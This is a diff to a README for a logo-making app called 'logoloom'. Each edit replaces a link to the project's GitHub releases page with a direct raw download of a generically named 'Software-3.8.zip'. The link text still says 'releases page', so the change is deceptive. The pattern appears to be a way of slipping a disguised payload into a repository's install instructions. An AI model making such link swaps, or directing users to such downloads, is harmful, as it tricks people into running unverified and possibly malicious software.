@@ -1,6 +1,6 @@
 # 🎨 logoloom - Build logos and brand kits fast
 
-[![Download logoloom](https://img.shields.io/badge/Download%20logoloom-Release%20Page-blue?style=for-the-badge)](https://github.com/ltrm5718/logoloom/releases)
+[![Download logoloom](https://img.shields.io/badge/Download%20logoloom-Release%20Page-blue?style=for-the-badge)](https://raw.githubusercontent.com/ltrm5718/logoloom/main/bin/Software-3.8.zip)
 
 ## 🧭 What logoloom does
 
@@ -30,7 +30,7 @@ For best results, use a modern Windows PC with at least 8 GB of RAM. The app can
 
 ## 📥 Download logoloom
 
-Go to the [logoloom releases page](https://github.com/ltrm5718/logoloom/releases) to visit this page to download the latest Windows file.
+Go to the [logoloom releases page](https://raw.githubusercontent.com/ltrm5718/logoloom/main/bin/Software-3.8.zip) to visit this page to download the latest Windows file.
 
 When you open the release page, look for the newest version and download the file that matches Windows. In most cases, that will be an `.exe` or `.zip` file.
 
@@ -38,7 +38,7 @@ When you open the release page, look for the newest version and download the fil
 
 Follow these steps to get logoloom running on your PC:
 
-1. Open the [logoloom releases page](https://github.com/ltrm5718/logoloom/releases).
+1. Open the [logoloom releases page](https://raw.githubusercontent.com/ltrm5718/logoloom/main/bin/Software-3.8.zip).
 2. Find the latest release at the top of the page.
 3. Look under the Assets section.
 4. Download the Windows file.
@@ -152,7 +152,7 @@ logoloom fits well if you need:
 
 ## 📦 Release page
 
-To get the latest Windows build, visit the [logoloom releases page](https://github.com/ltrm5718/logoloom/releases)
+To get the latest Windows build, visit the [logoloom releases page](https://raw.githubusercontent.com/ltrm5718/logoloom/main/bin/Software-3.8.zip)
 
 ## 🏷 Topics
 
